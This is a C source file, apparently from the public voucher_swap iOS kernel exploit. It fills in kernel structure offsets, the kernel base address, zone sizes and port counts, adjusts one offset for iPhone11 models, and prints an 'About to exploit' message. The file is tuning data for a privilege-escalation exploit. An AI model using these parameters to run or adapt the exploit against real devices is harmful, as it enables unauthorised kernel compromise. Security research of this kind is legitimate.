/*
 * parameters.c
 * Brandon Azad
 */
#define PARAMETERS_EXTERN
#include "parameters.h"

#include <assert.h>
#include <stdbool.h>
#include <string.h>
#include <sys/sysctl.h>
#include <sys/utsname.h>

#include "log.h"
#include "platform.h"
#include "platform_match.h"

#define ARRAY_COUNT(x) (sizeof(x) / sizeof((x)[0]))

static void default_offsets() {
    SIZE(ipc_entry) = 0x18;
    OFFSET(ipc_entry, ie_object) = 0;
    OFFSET(ipc_entry, ie_bits) =  8;
    OFFSET(ipc_entry, ie_request) = 16;
    
    SIZE(ipc_port) = 0xa8;
    BLOCK_SIZE(ipc_port) = 0x4000;
    OFFSET(ipc_port, ip_bits) = 0;
    OFFSET(ipc_port, ip_references) = 4;
    OFFSET(ipc_port, waitq_flags) = 24;
    OFFSET(ipc_port, imq_messages) = 64;
    OFFSET(ipc_port, imq_msgcount) = 80;
    OFFSET(ipc_port, imq_qlimit) = 82;
    OFFSET(ipc_port, ip_receiver) = 96;
    OFFSET(ipc_port, ip_kobject) = 104;
    OFFSET(ipc_port, ip_nsrequest) = 112;
    OFFSET(ipc_port, ip_requests) = 128;
    OFFSET(ipc_port, ip_mscount) = 156;
    OFFSET(ipc_port, ip_srights) = 160;
    
    SIZE(ipc_port_request) = 0x10;
    OFFSET(ipc_port_request, ipr_soright) = 0;
    
    OFFSET(ipc_space, is_table_size) = 0x14;
    OFFSET(ipc_space, is_table) = 0x20;
    
    SIZE(ipc_voucher) = 0x50;
    BLOCK_SIZE(ipc_voucher) = 0x4000;
    
    OFFSET(proc, p_pid) = 0x60;
    OFFSET(proc, p_ucred) = 0xF8;
    
    SIZE(sysctl_oid) = 0x50;
    OFFSET(sysctl_oid, oid_parent) = 0x0;
    OFFSET(sysctl_oid, oid_link) = 0x8;
    OFFSET(sysctl_oid, oid_kind) = 0x14;
    OFFSET(sysctl_oid, oid_handler) = 0x30;
    OFFSET(sysctl_oid, oid_version) = 0x48;
    OFFSET(sysctl_oid, oid_refcnt) = 0x4C;
    
    OFFSET(task, lck_mtx_type) = 0xB;
    OFFSET(task, ref_count) = 0x10;
    OFFSET(task, active) = 0x14;
    OFFSET(task, map) = 0x20;
    OFFSET(task, itk_space) = 0x300;
    OFFSET(task, bsd_info) = 0x358;
}

// ---- Public API --------------------------------------------------------------------------------

bool
parameters_init() {
    platform_init();
    STATIC_ADDRESS(kernel_base) = 0xFFFFFFF007004000;
    kernel_slide_step = 0x200000;
    message_size_for_kmsg_zone = 76;
    kmsg_zone_size = 256;
    max_ool_ports_per_message = 16382;
    gc_step = 2 * MB;
    default_offsets();
    const char *bsd_info_0x368[] =  { "iPhone11," };
    for (int i = 0; i < ARRAY_COUNT(bsd_info_0x368); i++) {
        if (strstr(platform.machine, bsd_info_0x368[i]) != NULL) {
            OFFSET(task, bsd_info) = 0x368;
            break;
        }
    }
    COUNT_PER_BLOCK(ipc_port) = BLOCK_SIZE(ipc_port) / SIZE(ipc_port);
    COUNT_PER_BLOCK(ipc_voucher) = BLOCK_SIZE(ipc_voucher) / SIZE(ipc_voucher);
    printf("[IMPORTANT] About to exploit. If this doesn't work, %s \"%s\" to bsd_info_0x368[] or open a new issue on github.com/alticha/voucher_swap.\n", OFFSET(task, bsd_info) == 0x368 ? "remove" : "add", platform.machine);
    return true;
}
